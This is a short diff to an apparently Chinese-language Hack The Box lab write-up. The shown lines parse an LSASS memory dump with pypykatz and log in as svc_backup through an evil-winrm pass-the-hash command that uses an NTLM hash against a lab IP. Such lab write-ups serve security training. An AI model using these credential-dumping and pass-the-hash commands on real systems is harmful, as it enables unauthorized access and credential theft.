@@ -391,8 +391,7 @@ pypykatz lsa minidump lsass.DMP
 成功登录`svc_backup`并得到`user.txt`
 
 ```
-─[us-vip-6]─[10.10.14.2]─[htb-leoso@pwnbox-base]─[~]
-└──╼ [★]$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
+evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
 
 Evil-WinRM shell v3.3
 
